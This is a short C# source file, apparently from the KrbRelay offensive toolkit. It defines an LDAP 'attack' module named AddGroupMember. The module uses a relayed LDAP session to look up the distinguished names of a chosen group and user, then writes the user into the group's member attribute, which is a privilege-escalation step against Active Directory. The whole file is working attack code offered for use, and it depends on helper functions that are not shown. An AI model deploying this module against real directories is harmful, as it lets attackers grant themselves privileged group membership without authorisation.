using System;
using System.Text;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class AddGroupMember
    {
        public static LdapStatus attack(IntPtr ld, string group, string user)
        {
            string groupDn = Generic.getPropertyValue(ld, group, "distinguishedName");
            string userDn = Generic.getPropertyValue(ld, user, "distinguishedName");
            return Generic.addAttribute(ld, "member", Encoding.ASCII.GetBytes(userDn), groupDn);
        }
    }
}
